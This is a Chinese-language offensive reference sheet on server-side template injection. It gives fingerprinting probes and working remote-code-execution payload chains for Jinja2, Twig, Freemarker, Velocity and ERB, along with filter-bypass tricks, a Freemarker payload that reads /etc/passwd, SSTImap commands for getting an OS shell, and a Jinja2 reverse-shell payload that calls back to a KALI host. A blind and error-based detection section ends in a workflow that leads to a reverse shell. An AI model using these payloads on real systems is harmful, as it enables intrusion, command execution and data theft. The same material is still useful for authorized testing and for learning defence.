# SSTI 服务端模板注入 详细参考

---

## 指纹识别流程

```
{{7*7}}=49        → {{}} 系
  {{7*'7'}}=7777777 → Jinja2 (Python)
  {{7*'7'}}=49      → Twig (PHP)

${7*7}=49         → Freemarker / Velocity / Spring EL (Java)
<%= 7*7 %>=49     → ERB (Ruby) / EJS (Node.js)
#{7*7}=49         → Slim / Pug
${{7*7}}=49       → Thymeleaf (Java)

拿不准时发polyglot看报错: ${{<%[%'"}}%\
```

场景：凡是"输入什么、页面就回显什么"的点都测——注册用户名、搜索框、个人资料、邮件模板、页面标题。

---

## Jinja2 (Python Flask)

```
# 验证能访问对象
{{config}}

# RCE（主链）
{{cycler.__init__.__globals__.os.popen('id').read()}}

# 备选链
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# 反弹shell
{{cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/KALI/4444 0>&1"').read()}}

# 更多链（被过滤时换）
{{lipsum.__globals__.os.popen('id').read()}}
{{url_for.__globals__.os.popen('id').read()}}
{{request.application.__self__._get_data_for_json.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

### 过滤绕过
```
# 过滤 . → 用 attr() 或 []
{{config|attr('__class__')}}
{{config['__class__']}}

# 过滤 _ → 用 \x5f 或 request.args
{{config['\x5f\x5fclass\x5f\x5f']}}

# 过滤 {{ → 用 {% %}
{% if config.__class__.__init__.__globals__['os'].popen('id').read() %}a{% endif %}
```

---

## Twig (PHP)

```
# RCE
{{['id']|filter('system')}}
{{['id']|map('system')}}

# 旧版Twig (<1.x)
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

---

## Freemarker (Java)

```
# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# 读文件
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

---

## Velocity (Java)

```
#set($cmd = 'id')
#set($rt = $class.inspect("java.lang.Runtime").type)
#set($getRuntime = $rt.getMethod("getRuntime"))
#set($runtime = $getRuntime.invoke($null))
#set($proc = $runtime.exec($cmd))
```

---

## ERB (Ruby)

```
<%= system('id') %>
<%= `id` %>
```

---

## 自动化

```
# SSTImap检测+利用
SSTImap -u 'http://TARGET/page?name=*'              # *标注入点
SSTImap -u 'http://TARGET/page?name=*' --os-shell    # 交互shell
SSTImap -u 'http://TARGET/page?name=*' --os-cmd id   # 单命令

# POST参数
SSTImap -u 'http://TARGET/page' -d 'name=*' --os-shell
```

---

## 注意事项

- 顺序不能乱：先 {{7*7}} 确认 → 再指纹引擎 → 再上RCE链
- 引擎判错payload全废
- 反弹shell里的 >& | 务必URL编码

---

## Blind / Error-Based SSTI — Successful Errors（2025）

传统 `{{7*7}} → 49` 只覆盖“结果被模板直接渲染”的情况。现代 Web/邮件模板/PDF/异步任务经常：

```text
payload被执行
但渲染结果不回显
或只返回统一500/异步状态
```

这时不要因为没有 `49` 就放弃 SSTI。

### 1. 建立稳定基线

先连续发送几次正常输入，记录：

```text
HTTP status
响应长度/word count
重定向次数
最终URL
响应时间
特征header
```

确保目标本身不是随机波动页面。

### 2. Generic syntax-error pair

Successful Errors 研究使用“仅有极小差异”的 payload 对来检测 blind code/template injection。通用思路：

```text
有效算术表达式       → 应正常
近似但语法错误表达式 → 应触发稳定错误
```

例如概念探针：

```text
(3*4/2)
3*)2(/4
```

以及：

```text
((7*8)/(2*4))
7)(*)8)(2/(*4
```

**判断不能只看500：** 至少使用两组相似 payload + 多次重复，避免 WAF/随机错误造成假阳性。

### 3. Boolean Error-Based Blind

确认模板/语言后，用“条件成立时正常、条件失败时触发错误”建立布尔 oracle：

```text
TRUE expression  → 基线响应
FALSE expression → 稳定异常响应
```

Jinja2 示例结构：

```jinja2
{{ 1 / (not not CONDITION) }}
```

例如先用无害条件验证 oracle：

```jinja2
{{ 1 / (not not (7*7==49)) }}
{{ 1 / (not not (7*7==48)) }}
```

如果两者稳定产生不同响应，再把 `CONDITION` 替换为针对目标值/命令退出码的条件。

### 4. Error-Based output

如果应用把错误详细信息回显，可寻找“错误消息包含用户可控值”的 primitive，把模板表达式/命令结果嵌入错误消息中。

流程：

```text
模板执行确认
   ↓
错误是否回显输入值？
   ↓
YES → Error-Based output extraction
NO  → Boolean Error-Based / time / OOB
```

### 5. SSTImap

Successful Errors 的 generic/error-based 技术已经并入 SSTImap 新版本。由于 SSTImap CLI 在版本间有变化，先检查本机版本：

```bash
SSTImap --help
SSTImap -u 'http://TARGET/page?name=*'
```

已有版本支持 OS shell/command 时再按 `--help` 中对应参数执行。你原环境若仍支持：

```bash
SSTImap -u 'http://TARGET/page?name=*' --os-shell
SSTImap -u 'http://TARGET/page?name=*' --os-cmd id
```

### 6. 成功门控

```text
Blind SSTI confirmed
    ↓
模板/语言指纹
    ↓
Error / Boolean / Time / OOB oracle
    ↓
RCE primitive
    ↓
反弹Shell
    ↓
/web-attack COMPLETE
```

不要为了证明漏洞直接上破坏性命令；先 `id` / `whoami` / 受控 OOB，再转 shell。
